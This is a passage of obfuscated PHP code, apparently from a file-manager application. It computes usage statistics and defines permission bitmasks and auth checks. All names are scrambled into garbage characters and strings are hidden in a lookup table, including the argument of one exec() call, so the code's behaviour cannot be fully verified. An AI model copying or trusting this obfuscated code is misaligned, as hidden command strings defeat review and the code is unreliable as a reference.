array($µ–‚×Ü±[33] => $µ–‚×Ü±[1832], $µ–‚×Ü±[319] => array($µ–‚×Ü±[241], $µ–‚×Ü±[802], $µ–‚×Ü±[1833], $µ–‚×Ü±[1834], $µ–‚×Ü±[1835]))); if (!isset($æ¤¯Ô©Ú[$¡å‘Ü„ê])) { return !1; } $this->optionType = $æ¤¯Ô©Ú[$¡å‘Ü„ê][$µ–‚×Ü±[33]]; $this->field = $æ¤¯Ô©Ú[$¡å‘Ü„ê][$µ–‚×Ü±[319]]; return !0; } public function listData($©·×‹±³ = false, $×˜ÆÈôÇ = "\x6d\x6f\144\x69\x66\171\124\151\x6d\x65", $İØûå° = false) { return parent::listData($©·×‹±³, $×˜ÆÈôÇ, $İØûå°); } public function trendList($ãÇ¦ ”ë) { $¼»Ñœò© =& $_SERVER[ò«¥Ê‡å]; $Ÿ¸ö¥ « = $this->listData(); if ($Ÿ¸ö¥ «) { $í°ó°Œ• = end($Ÿ¸ö¥ «); $í›Ø‡‘² = date($¼»Ñœò©[1836], strtotime($¼»Ñœò©[1837])); if ($í°ó°Œ•[$¼»Ñœò©[241]] == $í›Ø‡‘²) { return $Ÿ¸ö¥ «; } $ü¦Øù¼€ = strtotime($í°ó°Œ•[$¼»Ñœò©[241]]); } if (!isset($ü¦Øù¼€)) { $“†Íèº± = $ãÇ¦ ”ë == $¼»Ñœò©[632] ? $¼»Ñœò©[569] : $¼»Ñœò©[871]; $ü¦Øù¼€ = Model($“†Íèº±)->min($¼»Ñœò©[217]); } $‰ÛœÇ·Ñ = $¼»Ñœò©[1838] . ucfirst($ãÇ¦ ”ë); $Ù£çÁÄÙ = $this->dateList($ü¦Øù¼€); foreach ($Ù£çÁÄÙ as $í›Ø‡‘²) { $this->{$‰ÛœÇ·Ñ}($í›Ø‡‘²); } return $this->listData(); } private function dateList($Ëû”¯‡¾) { $Šˆ½Œƒ— =& $_SERVER[ò«¥Ê‡å]; $¯¾£­ü = $Ëû”¯‡¾; $¨¬Ã°½ğ = strtotime($Šˆ½Œƒ—[1837]); $îÈ‹¨šš = array(); while ($¯¾£­ü <= $¨¬Ã°½ğ) { $îÈ‹¨šš[] = date($Šˆ½Œƒ—[1836], $¯¾£­ü); $¯¾£­ü = strtotime($Šˆ½Œƒ—[1839], $¯¾£­ü); } return $îÈ‹¨šš; } public function _recordUser($¹´©ó©Ÿ = '') { $¤Ï¤ì³¤ =& $_SERVER[ò«¥Ê‡å]; $¿Í­Ì† = strtotime(date($¤Ï¤ì³¤[1840], strtotime($¹´©ó©Ÿ))); $å‹¢à¤ = strtotime(date($¤Ï¤ì³¤[1841], strtotime($¹´©ó©Ÿ))); $†ã¦êä = array($¤Ï¤ì³¤[217] => array($¤Ï¤ì³¤[1060], $å‹¢à¤)); $İœºˆ = Model($¤Ï¤ì³¤[569])->where($†ã¦êä)->count($¤Ï¤ì³¤[1701]); $†ã¦êä[$¤Ï¤ì³¤[217]] = array($¤Ï¤ì³¤[379], array($¿Í­Ì†, $å‹¢à¤)); $”¢ì¬³ = Model($¤Ï¤ì³¤[569])->where($†ã¦êä)->count($¤Ï¤ì³¤[1701]); $†ã¦êä[$¤Ï¤ì³¤[33]] = $¤Ï¤ì³¤[1842]; $Îï÷—öı = Model($¤Ï¤ì³¤[1843])->where($†ã¦êä)->count($¤Ï¤ì³¤[1844]); $Áı½ïĞ = array($¤Ï¤ì³¤[241] => $¹´©ó©Ÿ, $¤Ï¤ì³¤[804] => (int) $İœºˆ, $¤Ï¤ì³¤[1829] => (int) $”¢ì¬³, $¤Ï¤ì³¤[1830] => (int) $Îï÷—öı); return $this->insert($Áı½ïĞ); } public function _recordStore($Ğ¼íş”† = '') { $ôŒ÷Àî† =& $_SERVER[ò«¥Ê‡å]; $‚—¨ë´± = strtotime(date($ôŒ÷Àî†[1841], strtotime($Ğ¼íş”†))); $õƒªå‡ = array($ôŒ÷Àî†[217] => array($ôŒ÷Àî†[1060], $‚—¨ë´±)); $È†ğ› = Model($ôŒ÷Àî†[514])->where($õƒªå‡)->sum($ôŒ÷Àî†[78]); $õƒªå‡[$ôŒ÷Àî†[455]] = 0; $®çŞĞ§ = Model($ôŒ÷Àî†[871])->where($õƒªå‡)->sum($ôŒ÷Àî†[78]); $õƒªå‡[$ôŒ÷Àî†[180]] = 1; $Åğú™ñì = Model($ôŒ÷Àî†[871])->where($õƒªå‡)->sum($ôŒ÷Àî†[78]); $õƒªå‡[$ôŒ÷Àî†[180]] = 2; $âŒÉÎ¿ = Model($ôŒ÷Àî†[871])->where($õƒªå‡)->sum($ôŒ÷Àî†[78]); $ĞÌãĞÍ“ = array($ôŒ÷Àî†[241] => $Ğ¼íş”†, $ôŒ÷Àî†[802] => (int) $®çŞĞ§, $ôŒ÷Àî†[1833] => (int) $È†ğ›, $ôŒ÷Àî†[1834] => (int) $Åğú™ñì, $ôŒ÷Àî†[1835] => (int) $âŒÉÎ¿); return $this->insert($ĞÌãĞÍ“); } public function trend($üÁñúÅé, $ê°™©º¿) { $¬ÇãĞÜª =& $_SERVER[ò«¥Ê‡å]; if (!$this->init($üÁñúÅé)) { return !1; } $ğ„ÚöŸ­ = $this->trendList($üÁñúÅé); if ($ğ„ÚöŸ­ && $ê°™©º¿ != $¬ÇãĞÜª[1674]) { $¨×„Çıõ = $ğ„ÚöŸ­[0][$¬ÇãĞÜª[241]]; $µõ‹´°  = $this->validDate($ê°™©º¿, $¨×„Çıõ); $š Ú˜Õ = array(); $„­Ãäº = array_to_keyvalue($ğ„ÚöŸ­, $¬ÇãĞÜª[241]); foreach ($µõ‹´°  as $Ì²‘Ïı) { if (isset($„­Ãäº[$Ì²‘Ïı])) { $è²’¼¶ = $„­Ãäº[$Ì²‘Ïı]; } else { $è²’¼¶ = end($ğ„ÚöŸ­); $è²’¼¶[$¬ÇãĞÜª[241]] = $Ì²‘Ïı; if ($üÁñúÅé == $¬ÇãĞÜª[632]) { $è²’¼¶[$¬ÇãĞÜª[1829]] = $è²’¼¶[$¬ÇãĞÜª[1830]] = 0; } } $š Ú˜Õ[] = $è²’¼¶; } $ğ„ÚöŸ­ = $š Ú˜Õ; } $¥Í†ƒ®¤ = array($¬ÇãĞÜª[632] => array($¬ÇãĞÜª[804] => LNG($¬ÇãĞÜª[1845]), $¬ÇãĞÜª[1829] => LNG($¬ÇãĞÜª[1846]), $¬ÇãĞÜª[1830] => LNG($¬ÇãĞÜª[1847])), $¬ÇãĞÜª[1831] => array($¬ÇãĞÜª[802] => LNG($¬ÇãĞÜª[1848]), $¬ÇãĞÜª[1833] => LNG($¬ÇãĞÜª[1849]), $¬ÇãĞÜª[1834] => LNG($¬ÇãĞÜª[1850]), $¬ÇãĞÜª[1835] => LNG($¬ÇãĞÜª[1851]))); $¡ŠşâúÙ = array($¬ÇãĞÜª[632] => $¬ÇãĞÜª[1852], $¬ÇãĞÜª[1831] => $¬ÇãĞÜª[78]); if (empty($ğ„ÚöŸ­)) { $Ì²‘Ïı = date($¬ÇãĞÜª[1836], strtotime($¬ÇãĞÜª[1837])); $¹¾òİŞ¼ = array($¬ÇãĞÜª[241] => $Ì²‘Ïı); foreach ($¥Í†ƒ®¤[$üÁñúÅé] as $½·¹« => $ÙÒèºù±) { $¹¾òİŞ¼[$½·¹«] = 0; } $ğ„ÚöŸ­[] = $¹¾òİŞ¼; } $°ª»¹ = array(); foreach ($ğ„ÚöŸ­ as $ÙÒèºù±) { if ($üÁñúÅé == $¬ÇãĞÜª[1831] && $ÙÒèºù±[$¬ÇãĞÜª[1833]] > $ÙÒèºù±[$¬ÇãĞÜª[802]]) { $ÙÒèºù±[$¬ÇãĞÜª[1833]] = $ÙÒèºù±[$¬ÇãĞÜª[802]]; } foreach ($¥Í†ƒ®¤[$üÁñúÅé] as $½·¹« => $œ¦ŠüœŸ) { $è²’¼¶ = array($¬ÇãĞÜª[241] => $ÙÒèºù±[$¬ÇãĞÜª[241]], $¬ÇãĞÜª[1591] => $œ¦ŠüœŸ); $è²’¼¶[$¡ŠşâúÙ[$üÁñúÅé]] = isset($ÙÒèºù±[$½·¹«]) ? $ÙÒèºù±[$½·¹«] : 0; $°ª»¹[] = $è²’¼¶; } } return $°ª»¹; } public function validDate($†ıöŸ›Ø, $ÊÎ‰Çï) { $ö€›ä”£ =& $_SERVER[ò«¥Ê‡å]; $¢ŞŸ€îş = date($ö€›ä”£[1836], strtotime($ö€›ä”£[1837])); $´¨ÓîÀ = array($¢ŞŸ€îş); switch ($†ıöŸ›Ø) { case $ö€›ä”£[1681]: $ò ¤—¶¤ = mktime(0, 0, 0, date($ö€›ä”£[1853]), date($ö€›ä”£[1408]) - date($ö€›ä”£[1473]) + 7 - 7, date($ö€›ä”£[1854])); $Û­ÇúªÑ = 0; do { $€†‰à²Œ = date($ö€›ä”£[1836], $ò ¤—¶¤ - 3600 * 24 * 7 * $Û­ÇúªÑ); $´¨ÓîÀ[] = $€†‰à²Œ; $Û­ÇúªÑ++; } while ($ÊÎ‰Çï < $€†‰à²Œ); break; case $ö€›ä”£[1679]: $Û­ÇúªÑ = 1; do { $ÇĞâÇØÑ = date($ö€›ä”£[1855], strtotime("\x2d\40{$Û­ÇúªÑ}\40\x6d\157\x6e\164\x68\x73")); $´¨ÓîÀ[] = $ÇĞâÇØÑ; $Û­ÇúªÑ++; } while ($ÊÎ‰Çï < $ÇĞâÇØÑ); break; case $ö€›ä”£[1856]: $–»Üüâ = (int) date($ö€›ä”£[1854], strtotime($ÊÎ‰Çï)); $£Š‡šğë = (int) date($ö€›ä”£[1854]); if ($–»Üüâ >= $£Š‡šğë) { break; } for ($–»Üüâ; $–»Üüâ < $£Š‡šğë; $–»Üüâ++) { $´¨ÓîÀ[] = $–»Üüâ . $ö€›ä”£[1857]; } break; default: break; } if ($ÊÎ‰Çï > end($´¨ÓîÀ)) { array_pop($´¨ÓîÀ); } sort($´¨ÓîÀ); return $´¨ÓîÀ; } public function listTable($’€¦±Ä ) { $ˆĞÇÁáÖ = ucfirst($’€¦±Ä ); return Model($ˆĞÇÁáÖ)->listData(); } public function option($ßá´Š†š) { $°“¡Ä¥œ = $_SERVER[ò«¥Ê‡å][1858] . ucfirst($ßá´Š†š); return $this->{$°“¡Ä¥œ}(); } private function optionUser() { $Õ‰ôÏ«â =& $_SERVER[ò«¥Ê‡å]; $€ ¸é•ª = Model($Õ‰ôÏ«â[569])->count($Õ‰ôÏ«â[1701]); $áäÚ–Ş£ = Model($Õ‰ôÏ«â[569])->where($Õ‰ôÏ«â[1859])->count($Õ‰ôÏ«â[1701]); $âÕ–Ï¼È = intval($GLOBALS[$Õ‰ôÏ«â[6]][$Õ‰ôÏ«â[395]][$Õ‰ôÏ«â[1647]]) / 3600; $áıêÆ¬ô = strtotime("\x2d{$âÕ–Ï¼È}\x20\150\157\165\x72\163"); $¢ÀÁ‘¦ˆ = strtotime(date($Õ‰ôÏ«â[1840])); if ($áıêÆ¬ô < $¢ÀÁ‘¦ˆ) { $áıêÆ¬ô = $¢ÀÁ‘¦ˆ; } $Å®ÅşÎÛ = array($Õ‰ôÏ«â[1860] => array($Õ‰ôÏ«â[1061], $áıêÆ¬ô)); $„‹ñ´Ï§ = (int) Model($Õ‰ôÏ«â[569])->where($Å®ÅşÎÛ)->count($Õ‰ôÏ«â[1701]); if (!$„‹ñ´Ï§) { $„‹ñ´Ï§ = 1; } $Å®ÅşÎÛ = array($Õ‰ôÏ«â[1860] => array($Õ‰ôÏ«â[1061], $¢ÀÁ‘¦ˆ)); $øÈøœ‚§ = Model($Õ‰ôÏ«â[569])->where($Å®ÅşÎÛ)->count($Õ‰ôÏ«â[1701]); return array($Õ‰ôÏ«â[797] => (int) $€ ¸é•ª, $Õ‰ôÏ«â[1861] => (int) ($€ ¸é•ª - $áäÚ–Ş£), $Õ‰ôÏ«â[1862] => (int) $áäÚ–Ş£, $Õ‰ôÏ«â[1863] => (int) $øÈøœ‚§, $Õ‰ôÏ«â[1864] => $„‹ñ´Ï§); } private function optionFile() { $ƒâØÊÔ’ =& $_SERVER[ò«¥Ê‡å]; $±î†¼Ú = $this->sourceSize(); $àÖ±ÈÍæ = $±î†¼Ú[$ƒâØÊÔ’[78]]; $ óŒ“§ı = $±î†¼Ú[$ƒâØÊÔ’[1833]]; $éù×éßç = Model($ƒâØÊÔ’[871])->where(array($ƒâØÊÔ’[455] => 0))->count($ƒâØÊÔ’[183]); $Ö©„Ùá = array($ƒâØÊÔ’[455] => 0, $ƒâØÊÔ’[217] => array($ƒâØÊÔ’[1061], strtotime(date($ƒâØÊÔ’[1840])))); $ß¶öÃ´ = Model($ƒâØÊÔ’[871])->where($Ö©„Ùá)->sum($ƒâØÊÔ’[78]); $­Äáëá— = Model($ƒâØÊÔ’[871])->where($Ö©„Ùá)->count($ƒâØÊÔ’[183]); return array($ƒâØÊÔ’[802] => $àÖ±ÈÍæ, $ƒâØÊÔ’[1833] => $ óŒ“§ı, $ƒâØÊÔ’[1865] => $àÖ±ÈÍæ - $ óŒ“§ı, $ƒâØÊÔ’[1866] => (int) $ß¶öÃ´, $ƒâØÊÔ’[804] => (int) $éù×éßç, $ƒâØÊÔ’[1867] => (int) $­Äáëá—); } private function optionAccess() { $¢­˜Ò›ª =& $_SERVER[ò«¥Ê‡å]; return array($¢­˜Ò›ª[797] => $this->typeLogCnt(), $¢­˜Ò›ª[109] => $this->typeLogCnt($¢­˜Ò›ª[109]), $¢­˜Ò›ª[495] => $this->typeLogCnt($¢­˜Ò›ª[495]), $¢­˜Ò›ª[1868] => $this->typeLogCnt($¢­˜Ò›ª[1868]), $¢­˜Ò›ª[1869] => $this->typeLogCnt($¢­˜Ò›ª[1869]), $¢­˜Ò›ª[632] => $this->typeLogCnt($¢­˜Ò›ª[12], $¢­˜Ò›ª[1844])); } private function typeLogCnt($ò¤‹íİ¯ = '', $–ºş•Ã¦ = "\151\144") { $ú¨Ëöû’ =& $_SERVER[ò«¥Ê‡å]; $¹Ş©¢Îˆ = array($ú¨Ëöû’[109] => array($ú¨Ëöû’[1870], $ú¨Ëöû’[1871]), $ú¨Ëöû’[495] => array($ú¨Ëöû’[1872], $ú¨Ëöû’[1873]), $ú¨Ëöû’[1868] => array($ú¨Ëöû’[1874], $ú¨Ëöû’[1875], $ú¨Ëöû’[1876]), $ú¨Ëöû’[1869] => array($ú¨Ëöû’[1877], $ú¨Ëöû’[1878]), $ú¨Ëöû’[1879] => array($ú¨Ëöû’[1880], $ú¨Ëöû’[1881], $ú¨Ëöû’[1882])); $¸ÉêÆ¨Î = strtotime(date($ú¨Ëöû’[1840])); $ï•èÛæ = array($ú¨Ëöû’[217] => array($ú¨Ëöû’[1061], $¸ÉêÆ¨Î)); if ($ò¤‹íİ¯) { $ï•èÛæ[$ú¨Ëöû’[33]] = array($ú¨Ëöû’[7], $¹Ş©¢Îˆ[$ò¤‹íİ¯]); } $Ùäîœö« = Model($ú¨Ëöû’[1843])->where($ï•èÛæ)->count($–ºş•Ã¦); return (int) $Ùäîœö«; } private function optionServer() { $›†È…« =& $_SERVER[ò«¥Ê‡å]; $¾±ª»¸Ğ = $this->diskDriver(); $Š¤·ùİ— = KodIO::defaultDriver(); $Ÿ›ÍúĞ = array($›†È…«[863] => $Š¤·ùİ—[$›†È…«[445]]); $çÇ«ù† = Model($›†È…«[514])->where($Ÿ›ÍúĞ)->sum($›†È…«[78]); $¿ù÷úÛ = explode($›†È…«[53], $_SERVER[$›†È…«[146]]); $‰ Š¡Ÿ = $¿ù÷úÛ[0]; $®ïÛÍˆ = $GLOBALS[$›†È…«[6]][$›†È…«[21]]; $„¹§™¬¸ = $®ïÛÍˆ[$›†È…«[1023]]; if ($„¹§™¬¸ == $›†È…«[1011]) { $¾ä˜´¡ = explode($›†È…«[1329], $®ïÛÍˆ[$›†È…«[1022]]); $„¹§™¬¸ = $¾ä˜´¡[0]; } if ($„¹§™¬¸ == $›†È…«[959] || $„¹§™¬¸ == $›†È…«[850]) { $Û¨ÙˆÊ = Model()->db()->query($›†È…«[1883]); $Èó£…¥­ = $Û¨ÙˆÊ[0] && isset($Û¨ÙˆÊ[0][$›†È…«[1590]]) ? $Û¨ÙˆÊ[0][$›†È…«[1590]] : 0; $„¹§™¬¸ = $›†È…«[1884] . ($Èó£…¥­ ? $›†È…«[8] . $Èó£…¥­ : $›†È…«[12]); } $†ÅÑë®× = $GLOBALS[$›†È…«[6]][$›†È…«[395]][$›†È…«[873]]; return array($›†È…«[1885] => $¾±ª»¸Ğ ? $¾±ª»¸Ğ[$›†È…«[1886]] : 0, $›†È…«[1887] => $¾±ª»¸Ğ ? $¾±ª»¸Ğ[$›†È…«[1888]] : 0, $›†È…«[1889] => (int) $Š¤·ùİ—[$›†È…«[1886]] * 1024 * 1024 * 1024, $›†È…«[1890] => (int) $çÇ«ù†, $›†È…«[1891] => ucfirst($‰ Š¡Ÿ), $›†È…«[1892] => $›†È…«[1893] . PHP_VERSION, $›†È…«[1894] => phpBuild64() ? 64 : 32, $›†È…«[796] => str_replace($›†È…«[1177], $›†È…«[1039], $„¹§™¬¸), $›†È…«[395] => ucfirst($†ÅÑë®×), $›†È…«[32] => $_SERVER[$›†È…«[1895]]); } private function diskDriver() { $€ÒÜçšÑ =& $_SERVER[ò«¥Ê‡å]; $ıŠ‚İ¿Í = $€ÒÜçšÑ[8]; $ËĞô¸¶Ó = $GLOBALS[$€ÒÜçšÑ[6]][$€ÒÜçšÑ[1346]] == $€ÒÜçšÑ[1347]; if ($ËĞô¸¶Ó) { $ıŠ‚İ¿Í = $€ÒÜçšÑ[1896]; if (function_exists($€ÒÜçšÑ[1897])) { exec($€ÒÜçšÑ[1898], $µ‘¼Öí); $ıŠ‚İ¿Í = $µ‘¼Öí[1] . $€ÒÜçšÑ[8]; } } if (!file_exists($ıŠ‚İ¿Í)) { return; } $ÃÚÊûÌê = @disk_total_space($ıŠ‚İ¿Í); $å—Ö«Í˜ = $ÃÚÊûÌê - @disk_free_space($ıŠ‚İ¿Í); return array($€ÒÜçšÑ[1886] => $ÃÚÊûÌê, $€ÒÜçšÑ[1888] => $å—Ö«Í˜); } public function fileChart($éõ—©ÈÁ) { $ÓßÏ­–Ò =& $_SERVER[ò«¥Ê‡å]; if (isset($éõ—©ÈÁ[$ÓßÏ­–Ò[1701]])) { return Model($ÓßÏ­–Ò[871])->userFileTypeProfile($éõ—©ÈÁ[$ÓßÏ­–Ò[1701]]); } if (isset($éõ—©ÈÁ[$ÓßÏ­–Ò[1899]])) { return Model($ÓßÏ­–Ò[871])->groupFileTypeProfile($éõ—©ÈÁ[$ÓßÏ­–Ò[1899]]); } $ÀìÆÈº = $this->sourceSize(); $ªû´Ã„î = array($ÓßÏ­–Ò[182] => 0, $ÓßÏ­–Ò[180] => 1); $¬àÔ¼ô© = Model($ÓßÏ­–Ò[871])->where($ªû´Ã„î)->sum($ÓßÏ­–Ò[78]); $ªû´Ã„î[$ÓßÏ­–Ò[180]] = 2; $“¢Ö½¡Ğ = Model($ÓßÏ­–Ò[871])->where($ªû´Ã„î)->sum($ÓßÏ­–Ò[78]); return array($ÓßÏ­–Ò[802] => $ÀìÆÈº[$ÓßÏ­–Ò[78]], $ÓßÏ­–Ò[1833] => $ÀìÆÈº[$ÓßÏ­–Ò[1833]], $ÓßÏ­–Ò[1834] => (int) $¬àÔ¼ô©, $ÓßÏ­–Ò[1835] => (int) $“¢Ö½¡Ğ); } private function sourceSize() { $›ÍŠöÀ¬ =& $_SERVER[ò«¥Ê‡å]; $ùŒöŠáË = Model($›ÍŠöÀ¬[871])->where(array($›ÍŠöÀ¬[455] => 0))->sum($›ÍŠöÀ¬[78]); $§î‘È©¯ = Model($›ÍŠöÀ¬[514])->sum($›ÍŠöÀ¬[78]); if ($§î‘È©¯ > $ùŒöŠáË) { $§î‘È©¯ = $ùŒöŠáË; } return array($›ÍŠöÀ¬[78] => (int) $ùŒöŠáË, $›ÍŠöÀ¬[1833] => (int) $§î‘È©¯); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $®Ä»…Ãş =& $_SERVER[ò«¥Ê‡å]; $æÒÄ™´É = array(array($®Ä»…Ãş[464] => LNG($®Ä»…Ãş[1900]), $®Ä»…Ãş[1901] => $®Ä»…Ãş[1902], $®Ä»…Ãş[1903] => 1, $®Ä»…Ãş[1904] => 1, $®Ä»…Ãş[1905] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($®Ä»…Ãş[464] => LNG($®Ä»…Ãş[1906]), $®Ä»…Ãş[1901] => $®Ä»…Ãş[1907], $®Ä»…Ãş[1903] => 2, $®Ä»…Ãş[1904] => 1, $®Ä»…Ãş[1905] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($®Ä»…Ãş[464] => LNG($®Ä»…Ãş[1908]), $®Ä»…Ãş[1901] => $®Ä»…Ãş[1909], $®Ä»…Ãş[1903] => 3, $®Ä»…Ãş[1904] => 1, $®Ä»…Ãş[1905] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($®Ä»…Ãş[464] => LNG($®Ä»…Ãş[1910]), $®Ä»…Ãş[1901] => $®Ä»…Ãş[1911], $®Ä»…Ãş[1903] => 4, $®Ä»…Ãş[1904] => 1, $®Ä»…Ãş[1905] => self::AUTH_SHOW | self::AUTH_VIEW), array($®Ä»…Ãş[464] => LNG($®Ä»…Ãş[1912]), $®Ä»…Ãş[1901] => $®Ä»…Ãş[1913], $®Ä»…Ãş[1903] => 5, $®Ä»…Ãş[1904] => 1, $®Ä»…Ãş[1905] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($®Ä»…Ãş[464] => LNG($®Ä»…Ãş[1914]), $®Ä»…Ãş[1901] => $®Ä»…Ãş[1915], $®Ä»…Ãş[1903] => 6, $®Ä»…Ãş[1904] => 1, $®Ä»…Ãş[1905] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($®Ä»…Ãş[464] => LNG($®Ä»…Ãş[1916]), $®Ä»…Ãş[1901] => $®Ä»…Ãş[1917], $®Ä»…Ãş[1903] => 7, $®Ä»…Ãş[1904] => 1, $®Ä»…Ãş[1905] => 0)); return $æÒÄ™´É; } public static function authCheck($¦äå¢¡, $éœÒ–Úã) { $Îè‡°´ =& $_SERVER[ò«¥Ê‡å]; $¦äå¢¡ = intval($¦äå¢¡); if (KodUser::isRoot() && $GLOBALS[$Îè‡°´[6]][$Îè‡°´[1918]]) { return !0; } if ($¦äå¢¡ <= 0) { return !1; } if (($¦äå¢¡ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¦äå¢¡ & $éœÒ–Úã); } public static function authCheckShow($‹ôÁíÔš) { return self::authCheck($‹ôÁíÔš, self::AUTH_SHOW); } public static function authCheckView($ß„è½ÂÒ) { return self::authCheck($ß„è½ÂÒ, self::AUTH_VIEW); } public static function authCheckDownload($“ÛáæÉ) { return self::authCheck($“ÛáæÉ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($²•‡Õú) { return self::authCheck($²•‡Õú, self::AUTH_UPLOAD); } public static function authCheckEdit($‚„Ú£Œ) { return self::authCheck($‚„Ú£Œ, self::AUTH_EDIT); } public static function authCheckRemove($ÖÉ‚Ó™) { return self::authCheck($ÖÉ‚Ó™, self::AUTH_REMOVE); } public static function authCheckShare($Ú°åĞ§§) { return self::authCheck($Ú°åĞ§§, self::AUTH_SHARE); } public static function authCheckComment($›Ü®…) { return self::authCheck($›Ü®…, self::AUTH_COMMENT); } public static function authCheckEvent($üÂ©×÷) { return self::authCheck($üÂ©×÷, self::AUTH_EVENT); } public static function authCheckRoot($íª«Ïöõ) { return self::authCheck($íª«Ïöõ, self::AUTH_ROOT); } public static function authCheckAction($†ö³İ¹, $ä¯‰ÅÎ ) { $Ë­Â¾ôö =& $_SERVER[ò«¥Ê‡å]; $¬ö·ªò = array($Ë­Â¾ôö[1919] => self::AUTH_VIEW, $Ë­Â¾ôö[1241] => self::AUTH_DOWNLOAD, $Ë­Â¾ôö[109] => self::AUTH_UPLOAD, $Ë­Â¾ôö[1869] => self::AUTH_EDIT, $Ë­Â¾ôö[1868] => self::AUTH_REMOVE, $Ë­Â¾ôö[1879] => self::AUTH_SHARE, $Ë­Â¾ôö[400] => self::AUTH_COMMENT, $Ë­Â¾ôö[1689] => self::AUTH_EVENT, $Ë­Â¾ôö[1920] => self::AUTH_ROOT); if (!isset($¬ö·ªò[$ä¯‰ÅÎ ])) { return; } $²¨ÚŠ¶ = $¬ö·ªò[$ä¯‰ÅÎ ]; $†ö³İ¹ = intval($†ö³İ¹); if ($†ö³İ¹ <= 0) { return !1; } if (($†ö³İ¹ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($†ö³İ¹ & $²¨ÚŠ¶); } public static function authDisable($ãâ¾À¶õ, $¢‹šüùê) { if (intval($ãâ¾À¶õ) <= 0) { return 0; } return intval($ãâ¾À¶õ) & ~$¢‹šüùê; } public $optionType = "\x53\x79\x73\164\145\x6d\x2e\163\x6f\x75\162\143\145\101\165\x74\150\114\151\163\x74"; public $field = array("\x6e\141\x6d\145", "\141\165\x74\x68", "\x6c\141\x62\x65\x6c", "\144\x69\x73\x70\154\x61\171", "\x73\171\163\164\x65\x6d", "\x73\157\162\164"); public function initData() { $ø›¢¼ğÁ = $this->authDefault(); foreach ($ø›¢¼ğÁ as $úµªáŠ÷) { $this->add($úµªáŠ÷); } } public function findAuth($í«‘»»µ, $ûö¿ŞÂú) { $Îú¶š =& $_SERVER[ò«¥Ê‡å]; $»ÉÎªœ‰ = parent::listData(); foreach ($»ÉÎªœ‰ as $š×Å¨ı) { $’À—ã„÷ = intval($š×Å¨ı[$Îú¶š[457]]); if ($’À—ã„÷ <= 0 || $š×Å¨ı[$Îú¶š[1921]] == 0) { continue; } if (($’À—ã„÷ & $í«‘»»µ) != $í«‘»»µ) { continue; } if (($’À—ã„÷ & $ûö¿ŞÂú) != 0) { continue; } return $š×Å¨ı[$Îú¶š[445]]; } return !1; } public function findAuthReadOnly() { $Íä§„Ï¨ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $ù¼²§äÓ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Íä§„Ï¨, $ù¼²§äÓ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $æ•ò÷†Ç =& $_SERVER[ò«¥Ê‡å]; $ı ¯ÌìŒ = parent::listData(); $Ó«ğÜ‰¦ = !1; foreach ($ı ¯ÌìŒ as $Ì½Ä‘îÖ) { if ($Ì½Ä‘îÖ[$æ•ò÷†Ç[457]] <= 0 || $Ì½Ä‘îÖ[$æ•ò÷†Ç[1921]] == $æ•ò÷†Ç[214]) { continue; } if (!$Ó«ğÜ‰¦) { $Ó«ğÜ‰¦ = $Ì½Ä‘îÖ; continue; } if ($Ó«ğÜ‰¦[$æ•ò÷†Ç[457]] > $Ì½Ä‘îÖ[$æ•ò÷†Ç[457]]) { $Ó«ğÜ‰¦ = $Ì½Ä‘îÖ; } } return $Ó«ğÜ‰¦ ? $Ó«ğÜ‰¦[$æ•ò÷†Ç[445]] : $æ•ò÷†Ç[12]; } public function listData($«Œâ™´ = false, $Ó“ÂÉíª = "\x73\x6f\162\x74", $Óõà·• = false) { return parent::listData($«Œâ™´, $Ó“ÂÉíª, $Óõà·•); } public function update($œÙËø†, $­­•áû) { $×¤Ø´â— =& $_SERVER[ò«¥Ê‡å]; $´Ô£À‡ = parent::listData($œÙËø†); $™ø’¸À = $this->findByName($­­•áû[$×¤Ø´â—[32]]); if (!$´Ô£À‡ || $™ø’¸À && $™ø’¸À[$×¤Ø´â—[445]] != $´Ô£À‡[$×¤Ø´â—[445]]) { return !1; } $this->filterAuth($­­•áû[$×¤Ø´â—[457]]); return parent::update($œÙËø†, $­­•áû); } public function remove($Öå‰¦ò•) { $¬ø½±ä® = parent::listData($Öå‰¦ò•); if (!$¬ø½±ä® || $¬ø½±ä®[$_SERVER[ò«¥Ê‡å][181]]) { return !1; } return parent::remove($Öå‰¦ò•); } public function add($¹êŸ÷Ø– = array()) { $€‘˜†ëö =& $_SERVER[ò«¥Ê‡å]; if ($this->findByName($¹êŸ÷Ø–[$€‘˜†ëö[32]])) { return !1; } $æ«·ïóÈ = array($€‘˜†ëö[32] => $€‘˜†ëö[12], $€‘˜†ëö[457] => 1, $€‘˜†ëö[1922] => $€‘˜†ëö[1909], $€‘˜†ëö[1921] => 1, $€‘˜†ëö[181] => 0, $€‘˜†ëö[1923] => 0); $¹êŸ÷Ø– = array_merge($æ«·ïóÈ, 